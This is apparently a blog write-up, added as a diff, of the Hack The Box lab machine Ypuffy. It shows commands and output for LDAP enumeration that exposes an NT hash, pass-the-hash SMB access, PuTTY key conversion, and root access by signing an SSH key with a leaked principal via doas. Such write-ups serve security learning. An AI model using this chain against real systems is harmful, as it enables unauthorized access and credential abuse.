@@ -1,0 +1,412 @@
+<hr />
+
+<h2 id="quick-summary">Quick Summary</h2>
+<p><br /> Hey guys today Ypuffy retired and this is my write-up. This box is a little different from the other boxes. It’s not windows or linux , it’s running openbsd which is a unix-like system. I really liked the privilege escalation in this box because it had some cool ssh stuff. Without talking too much let’s jump right in. It’s a medium difficulty box and its ip is 10.10.10.107 , i added it in <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">ypuffy.htb</code>
+<img src="/images/hackthebox/ypuffy/0.png" alt="" /></p>
+<hr />
+
+<h2 id="nmap">Nmap</h2>
+<p><br /> As always we will start with nmap so :
+<code class="highlighter-rouge">nmap -sV -sT -sC ypuffy.htb</code>
+<img src="/images/hackthebox/ypuffy/1.png" alt="" />
+<br /> Nmap tells us that there’s ssh running on port 22 , http on port 80 , smb on port 139 and 445 , ldap on port 389
+<br /> It also tells us that we can connect anonymously to ldap.
+<br /></p>
+<hr />
+
+<h2 id="initial-enumeration">Initial Enumeration</h2>
+<p><br /> Let’s check http first 
+<img src="/images/hackthebox/ypuffy/2.png" alt="" />
+<br /> Connection reset. http will be useful later but not now.
+<br /> Moving on to the next thing , we have smb. Let’s see if we can do a null authentication and enumerate the shares. We will use <code class="highlighter-rouge">smbmap</code>
+<code class="highlighter-rouge">smbmap -H ypuffy.htb</code>
+<img src="/images/hackthebox/ypuffy/3.png" alt="" />
+<br /> Access Denied.
+<br /> Let’s check ldap</p>
+<hr />
+
+<h2 id="ldap">LDAP</h2>
+<p><br /> nmap told us that anonymous authentication was allowed so we will use a tool called <code class="highlighter-rouge">ldapsearch</code> 
+<code class="highlighter-rouge">ldapsearch -h 10.10.10.107 -p 389 -x -b dc=hackthebox,dc=htb</code>
+<br /> Full Output :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># extended LDIF
+#
+# LDAPv3
+# base &lt;dc=hackthebox,dc=htb&gt; with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# hackthebox.htb
+dn: dc=hackthebox,dc=htb
+dc: hackthebox
+objectClass: top
+objectClass: domain
+
+# passwd, hackthebox.htb
+dn: ou=passwd,dc=hackthebox,dc=htb
+ou: passwd
+objectClass: top
+objectClass: organizationalUnit
+
+# bob8791, passwd, hackthebox.htb
+dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb
+uid: bob8791
+cn: Bob
+objectClass: account
+objectClass: posixAccount
+objectClass: top
+userPassword:: e0JTREFVVEh9Ym9iODc5MQ==
+uidNumber: 5001
+gidNumber: 5001
+gecos: Bob
+homeDirectory: /home/bob8791
+loginShell: /bin/ksh
+
+# alice1978, passwd, hackthebox.htb
+dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb
+uid: alice1978
+cn: Alice
+objectClass: account
+objectClass: posixAccount
+objectClass: top
+objectClass: sambaSamAccount
+userPassword:: e0JTREFVVEh9YWxpY2UxOTc4
+uidNumber: 5000
+gidNumber: 5000
+gecos: Alice
+homeDirectory: /home/alice1978
+loginShell: /bin/ksh
+sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001
+displayName: Alice
+sambaAcctFlags: [U          ]
+sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000
+sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B
+sambaPwdLastSet: 1532916644
+
+# group, hackthebox.htb
+dn: ou=group,dc=hackthebox,dc=htb
+ou: group
+objectClass: top
+objectClass: organizationalUnit
+
+# bob8791, group, hackthebox.htb
+dn: cn=bob8791,ou=group,dc=hackthebox,dc=htb
+objectClass: posixGroup
+objectClass: top
+cn: bob8791
+userPassword:: e2NyeXB0fSo=
+gidNumber: 5001
+
+# alice1978, group, hackthebox.htb
+dn: cn=alice1978,ou=group,dc=hackthebox,dc=htb
+objectClass: posixGroup
+objectClass: top
+cn: alice1978
+userPassword:: e2NyeXB0fSo=
+gidNumber: 5000
+
+# ypuffy, hackthebox.htb
+dn: sambadomainname=ypuffy,dc=hackthebox,dc=htb
+sambaDomainName: YPUFFY
+sambaSID: S-1-5-21-3933741069-3307154301-3557023464
+sambaAlgorithmicRidBase: 1000
+objectclass: sambaDomain
+sambaNextUserRid: 1000
+sambaMinPwdLength: 5
+sambaPwdHistoryLength: 0
+sambaLogonToChgPwd: 0
+sambaMaxPwdAge: -1
+sambaMinPwdAge: 0
+sambaLockoutDuration: 30
+sambaLockoutObservationWindow: 30
+sambaLockoutThreshold: 0
+sambaForceLogoff: -1
+sambaRefuseMachinePwdChange: 0
+sambaNextRid: 1001
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 9
+# numEntries: 8
+</code></pre></div></div>
+<p><br /> we can also use nmap to enumerate ldap , with a script called <code class="highlighter-rouge">ldap-search</code>
+<code class="highlighter-rouge">nmap -p 389 --script ldap-search ypuffy.htb</code>
+<br /> Full Output:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-08 14:30 EET
+Nmap scan report for ypuffy.htb (10.10.10.107)
+Host is up (0.14s latency).
+
+PORT    STATE SERVICE
+389/tcp open  ldap
+| ldap-search: 
+|   Context: dc=hackthebox,dc=htb
+|     dn: dc=hackthebox,dc=htb
+|         dc: hackthebox
+|         objectClass: top
+|         objectClass: domain
+|     dn: ou=passwd,dc=hackthebox,dc=htb
+|         ou: passwd
+|         objectClass: top
+|         objectClass: organizationalUnit
+|     dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb
+|         uid: bob8791
+|         cn: Bob
+|         objectClass: account
+|         objectClass: posixAccount
+|         objectClass: top
+|         userPassword: {BSDAUTH}bob8791
+|         uidNumber: 5001
+|         gidNumber: 5001
+|         gecos: Bob
+|         homeDirectory: /home/bob8791
+|         loginShell: /bin/ksh
+|     dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb
+|         uid: alice1978
+|         cn: Alice
+|         objectClass: account
+|         objectClass: posixAccount
+|         objectClass: top
+|         objectClass: sambaSamAccount
+|         userPassword: {BSDAUTH}alice1978
+|         uidNumber: 5000
+|         gidNumber: 5000
+|         gecos: Alice
+|         homeDirectory: /home/alice1978
+|         loginShell: /bin/ksh
+|         sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001
+|         displayName: Alice
+|         sambaAcctFlags: [U          ]
+|         sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000
+|         sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B
+|         sambaPwdLastSet: 1532916644
+|     dn: ou=group,dc=hackthebox,dc=htb
+|         ou: group
+|         objectClass: top
+|         objectClass: organizationalUnit
+|     dn: cn=bob8791,ou=group,dc=hackthebox,dc=htb
+|         objectClass: posixGroup
+|         objectClass: top
+|         cn: bob8791
+|         userPassword: {crypt}*
+|         gidNumber: 5001
+|     dn: cn=alice1978,ou=group,dc=hackthebox,dc=htb
+|         objectClass: posixGroup
+|         objectClass: top
+|         cn: alice1978
+|         userPassword: {crypt}*
+|         gidNumber: 5000
+|     dn: sambadomainname=ypuffy,dc=hackthebox,dc=htb
+|         sambaDomainName: YPUFFY
+|         sambaSID: S-1-5-21-3933741069-3307154301-3557023464
+|         sambaAlgorithmicRidBase: 1000
+|         objectclass: sambaDomain
+|         sambaNextUserRid: 1000
+|         sambaMinPwdLength: 5
+|         sambaPwdHistoryLength: 0
+|         sambaLogonToChgPwd: 0
+|         sambaMaxPwdAge: -1
+|         sambaMinPwdAge: 0
+|         sambaLockoutDuration: 30
+|         sambaLockoutObservationWindow: 30
+|         sambaLockoutThreshold: 0
+|         sambaForceLogoff: -1
+|         sambaRefuseMachinePwdChange: 0
+|_        sambaNextRid: 1001
+
+Nmap done: 1 IP address (1 host up) scanned in 2.17 seconds
+</code></pre></div></div>
+<p><br /> The most interesting part is this :
+<img src="/images/hackthebox/ypuffy/4.png" alt="" />
+<br /> We get a username <code class="highlighter-rouge">alice1978</code> and an smb NT hash <code class="highlighter-rouge">0B186E661BBDBDCF6047784DE8B9FD8B</code>
+<br /> This hash is uncrackable however we can still use it to authenticate.
+<br /></p>
+<hr />
+
+<h2 id="smb-enumeration">SMB Enumeration</h2>
+<p><br /> We need to list the shares first to know where we can connect. We can use a tool called <code class="highlighter-rouge">crackmapexec</code> :
+<code class="highlighter-rouge">crackmapexec ypuffy.htb -u alice1978 -H 0B186E661BBDBDCF6047784DE8B9FD8B --shares</code>
+<img src="/images/hackthebox/ypuffy/5.png" alt="" />
+<br /> There are only two shares <code class="highlighter-rouge">alice</code> and <code class="highlighter-rouge">IPC$</code> , we have read and write permissions to <code class="highlighter-rouge">alice</code> and no access to <code class="highlighter-rouge">IPC$</code>
+<br /> We can also use smbclient to list the shares :
+<code class="highlighter-rouge">smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash -L //ypuffy.htb/</code>
+<img src="/images/hackthebox/ypuffy/6.png" alt="" />
+<br /> But it doesn’t tell us which shares do we have access to and which we don’t.
+<br /> So we know that we can access the share <code class="highlighter-rouge">alice</code> , let’s connect.
+<code class="highlighter-rouge">smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash //ypuffy.htb/alice</code>
+<img src="/images/hackthebox/ypuffy/7.png" alt="" />
+<br /> There’s only one file called <code class="highlighter-rouge">my_private_key.ppk</code> , <code class="highlighter-rouge">get my_private_key.ppk</code> to download it.
+<br /></p>
+<hr />
+
+<h2 id="ssh-and-getting-user">SSH and getting user</h2>
+<p><br /> <code class="highlighter-rouge">my_private_key.ppk</code> is a putty private key , we need to convert that to an ssh private key to be able to ssh with it. 
+<br /> On kali I had to get <code class="highlighter-rouge">putty-tools</code> first 
+<code class="highlighter-rouge">apt-get install putty-tools</code>
+<br /> Then we will use <code class="highlighter-rouge">puttygen</code> :
+<code class="highlighter-rouge">puttygen my_private_key.ppk -O private-openssh -o alice.key</code>
+<br /> Now let’s take a look at the key :
+<img src="/images/hackthebox/ypuffy/8.png" alt="" />
+<br /> Last step is to <code class="highlighter-rouge">chmod 600 alice.key</code> and finally ssh
+<code class="highlighter-rouge">ssh -i alice.key alice1978@ypuffy.htb</code>
+<img src="/images/hackthebox/ypuffy/9.png" alt="" />
+<br /> And we owned user !
+<br /></p>
+<hr />
+
+<h2 id="more-enumeration">More Enumeration</h2>
+<p><br /> Remember http ? we got a connection reset. Let’s check <code class="highlighter-rouge">/etc/httpd.conf</code>
+<img src="/images/hackthebox/ypuffy/10.png" alt="" />
+<br /> We see two interesting things , <code class="highlighter-rouge">location "/userca*"</code> and <code class="highlighter-rouge">location "/sshauth*"</code>
+<br /> After some more enumeration , there are 3 users on the box 
+<img src="/images/hackthebox/ypuffy/11.png" alt="" />
+<br /> <code class="highlighter-rouge">alice1978</code> , <code class="highlighter-rouge">bob8791</code> and <code class="highlighter-rouge">userca</code>
+<br /> bob8791 has a directory called <code class="highlighter-rouge">dba</code>
+<img src="/images/hackthebox/ypuffy/12.png" alt="" />
+<br /> Inside it there’s an sql file called <code class="highlighter-rouge">sshauth.sql</code>
+<img src="/images/hackthebox/ypuffy/13.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/ypuffy/14.png" alt="" />
+<br /> It creates a table called <code class="highlighter-rouge">principals</code> and another table called <code class="highlighter-rouge">keys</code>
+<br /> If we also check <code class="highlighter-rouge">sshd_config</code> in <code class="highlighter-rouge">/etc/ssh/</code></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#	$OpenBSD: sshd_config,v 1.102 2018/02/16 02:32:40 djm Exp $
+
+# This is the sshd server system-wide configuration file.  See
+# sshd_config(5) for more information.
+
+# The strategy used for options in the default sshd_config shipped with
+# OpenSSH is to specify options with their default value where
+# possible, but leave them commented.  Uncommented options override the
+# default value.
+
+#Port 22
+#AddressFamily any
+#ListenAddress 0.0.0.0
+#ListenAddress ::
+
+#HostKey /etc/ssh/ssh_host_rsa_key
+#HostKey /etc/ssh/ssh_host_ecdsa_key
+#HostKey /etc/ssh/ssh_host_ed25519_key
+
+# Ciphers and keying
+#RekeyLimit default none
+
+# Logging
+#SyslogFacility AUTH
+#LogLevel INFO
+
+# Authentication:
+
+#LoginGraceTime 2m
+PermitRootLogin prohibit-password
+#StrictModes yes
+#MaxAuthTries 6
+#MaxSessions 10
+
+#PubkeyAuthentication yes
+
+# The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2
+# but this is overridden so installations will only check .ssh/authorized_keys
+AuthorizedKeysFile	.ssh/authorized_keys
+
+#AuthorizedPrincipalsFile none
+
+AuthorizedKeysCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=keys&amp;username=%u
+AuthorizedKeysCommandUser nobody
+
+TrustedUserCAKeys /home/userca/ca.pub
+AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&amp;username=%u
+AuthorizedPrincipalsCommandUser nobody
+
+# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
+#HostbasedAuthentication no
+# Change to yes if you don't trust ~/.ssh/known_hosts for
+# HostbasedAuthentication
+#IgnoreUserKnownHosts no
+# Don't read the user's ~/.rhosts and ~/.shosts files
+#IgnoreRhosts yes
+
+# To disable tunneled clear text passwords, change to no here!
+PasswordAuthentication no
+#PermitEmptyPasswords no
+
+# Change to no to disable s/key passwords
+ChallengeResponseAuthentication no
+
+AllowAgentForwarding no
+AllowTcpForwarding no
+#GatewayPorts no
+X11Forwarding no
+#X11DisplayOffset 10
+#X11UseLocalhost yes
+#PermitTTY yes
+#PrintMotd yes
+#PrintLastLog yes
+#TCPKeepAlive yes
+#UseLogin no
+#PermitUserEnvironment no
+#Compression delayed
+#ClientAliveInterval 0
+#ClientAliveCountMax 3
+#UseDNS no
+#PidFile /var/run/sshd.pid
+#MaxStartups 10:30:100
+#PermitTunnel no
+#ChrootDirectory none
+#VersionAddendum none
+
+# no default banner path
+#Banner none
+
+# override default of no subsystems
+Subsystem	sftp	/usr/libexec/sftp-server
+
+# Example of overriding settings on a per-user basis
+#Match User anoncvs
+#	X11Forwarding no
+#	AllowTcpForwarding no
+#	PermitTTY no
+#	ForceCommand cvs server
+
+</code></pre></div></div>
+<p><br /> This part :
+<img src="/images/hackthebox/ypuffy/15.png" alt="" />
+<br /> So that http service is responsible for some ssh authentication stuff , and we can request keys from <code class="highlighter-rouge">/sshauth?type=keys&amp;username=</code> and principals from <code class="highlighter-rouge">/sshauth?type=principals&amp;username=</code> , requesting keys for root gives us no response , but requesting the principal we get <code class="highlighter-rouge">3m3rgencyB4ckd00r</code>
+<img src="/images/hackthebox/ypuffy/16.png" alt="" /></p>
+<hr />
+
+<h2 id="generating-and-signing-ssh-keys--getting-root">Generating and signing ssh keys , Getting root</h2>
+<p><br /> So now we have root’s principal <code class="highlighter-rouge">3m3rgencyB4ckd00r</code>. Theoretically we can generate ssh keys and sign them with root’s principal , and we will be able to ssh as root with them.
+<br /> The problem is , as <code class="highlighter-rouge">alice1978</code> we are not authorized to do this. On linux we could check if we can run elevated commands with <code class="highlighter-rouge">sudo -l</code> but here there’s no sudo , instead of that there’s a command called <code class="highlighter-rouge">doas</code> , if we check the config file for it :
+<img src="/images/hackthebox/ypuffy/17.png" alt="" />
+<br /> We can run <code class="highlighter-rouge">ssh-keygen</code> as <code class="highlighter-rouge">userca</code> without password.
+<br /> First step is to create ssh keys for <code class="highlighter-rouge">alice1978</code> 
+<code class="highlighter-rouge">ssh-keygen -t rsa -f /tmp/id_rsa</code>
+<img src="/images/hackthebox/ypuffy/18.png" alt="" />
+<br /> Then we need the certificate (<code class="highlighter-rouge">ca</code>) in <code class="highlighter-rouge">/home/userca/</code> so we will cd there 
+<img src="/images/hackthebox/ypuffy/19.png" alt="" />
+<br /> And sign the ssh keys we have just created as root
+<code class="highlighter-rouge">doas -u userca /usr/bin/ssh-keygen -s ca -I root -n 3m3rgencyB4ckd00r /tmp/id_rsa</code>
+<br />
+<br />
+<code class="highlighter-rouge">doas -u userca /usr/bin/ssh-keygen -s ca -I root -n 3m3rgencyB4ckd00r /tmp/id_rsa.pub</code>
+<img src="/images/hackthebox/ypuffy/20.png" alt="" />
+<br /> <code class="highlighter-rouge">-s</code> for certificate , <code class="highlighter-rouge">-I</code> for identity and <code class="highlighter-rouge">-n</code> for principal
+<br /> Finally we will ssh as root :
+<code class="highlighter-rouge">ssh -i /tmp/id_rsa root@localhost</code>
+<img src="/images/hackthebox/ypuffy/21.png" alt="" />
+<br /> And we owned root !
+<br />
+<br />
+<br /> That’s it , Feedback is appreciated !
+<br /> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a>
+<br /> Thanks for reading.
+<br />
+<br />
+<br /> Previous Hack The Box write-up : <a href="/hack-the-box/dab/">Hack The Box - Dab</a>
+<br /> Next Hack The Box write-up : <a href="/hack-the-box/giddy/">Hack The Box - Giddy</a></p>
+<hr />
+
